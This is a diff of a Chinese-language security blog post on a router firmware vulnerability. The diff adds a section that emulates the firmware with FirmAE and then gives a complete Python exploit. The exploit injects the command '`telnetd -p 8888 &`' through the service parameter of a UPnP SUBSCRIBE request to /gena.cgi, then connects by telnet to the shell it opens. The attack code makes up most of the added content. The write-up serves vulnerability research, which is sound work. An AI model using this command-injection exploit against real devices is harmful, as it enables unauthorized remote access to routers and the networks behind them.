@@ -117,7 +117,7 @@ $sp &#43; 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参�
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          1 min read
+          2 min read
         </div>
         <div>
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
@@ -218,6 +218,35 @@ $sp &#43; 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参�
 </span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>close()
 </span></span></code></pre></div><p>用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell</p>
 <p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121518900.png?x-oss-process=style/zzz" alt="image-20240812151811845"></p>
+<h3 id="模拟环境利用">模拟环境利用</h3>
+<p>首先使用固件模拟工具FirmAE进行固件的模拟</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271550811.png?x-oss-process=style/zzz" alt="image-20240827155012711"></p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271550834.png?x-oss-process=style/zzz" alt="image-20240827155037742"></p>
+<p>然后直接运行以下exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.10.1&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">49152</span>
+</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;`telnetd -p 8888 &amp;`&#39;</span>
+</span></span><span style="display:flex;"><span>con <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, 
+</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SUBSCRIBE /gena.cgi?service=&#34;</span> <span style="color:#f92672">+</span> str(shell) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; HTTP/1.0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">+</span> str(server) <span style="color:#f92672">+</span> str(port) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;NT: upnp:event</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Timeout: Second-1800</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;Accept-Encoding: gzip, deflate</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>con<span style="color:#f92672">.</span>connect((socket<span style="color:#f92672">.</span>gethostbyname(server),port))
+</span></span><span style="display:flex;"><span>con<span style="color:#f92672">.</span>send(request<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>results <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;sucess&#34;</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;telnet &#39;</span> <span style="color:#f92672">+</span> str(server) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; 8888&#39;</span>)
+</span></span></code></pre></div><p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271551799.png?x-oss-process=style/zzz" alt="image-20240827155129730"></p>
+<p>可以成功获得shell</p>
 
     </div>
     <div class="post-footer">
